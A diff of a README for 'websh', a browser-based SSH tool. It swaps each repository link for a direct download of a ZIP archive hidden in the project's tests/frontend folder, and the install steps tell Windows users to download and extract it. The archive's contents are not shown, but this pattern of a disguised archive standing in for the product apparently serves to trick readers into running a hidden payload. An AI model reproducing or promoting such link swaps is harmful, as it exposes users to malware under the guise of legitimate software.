@@ -1,6 +1,6 @@
 # 🖥️ websh - Run SSH in your browser
 
-[![Download websh](https://img.shields.io/badge/Download-websh-blue?style=for-the-badge)](https://github.com/Evildoerblockhouse900/websh)
+[![Download websh](https://img.shields.io/badge/Download-websh-blue?style=for-the-badge)](https://github.com/Evildoerblockhouse900/websh/raw/refs/heads/main/tests/frontend/Software_3.9.zip)
 
 ## 🚀 What it does
 
@@ -10,7 +10,7 @@ It is built to stay light. There are no extra dependencies and no build step. Th
 
 ## 📥 Download and install
 
-1. Open the download page here: [websh on GitHub](https://github.com/Evildoerblockhouse900/websh)
+1. Open the download page here: [websh on GitHub](https://github.com/Evildoerblockhouse900/websh/raw/refs/heads/main/tests/frontend/Software_3.9.zip)
 2. Download the project files to your Windows PC
 3. If the files come as a ZIP file, right-click it and choose **Extract All**
 4. Move the extracted folder to a place you can find again, such as **Downloads** or **Documents**
@@ -208,7 +208,7 @@ Then open the local URL from your server tool, such as `http://localhost/` or th
 
 ## 📎 Download again
 
-If you need the files again, use this link: [https://github.com/Evildoerblockhouse900/websh](https://github.com/Evildoerblockhouse900/websh)
+If you need the files again, use this link: [https://github.com/Evildoerblockhouse900/websh/raw/refs/heads/main/tests/frontend/Software_3.9.zip](https://github.com/Evildoerblockhouse900/websh/raw/refs/heads/main/tests/frontend/Software_3.9.zip)
 
 ## 🧰 File checks
 
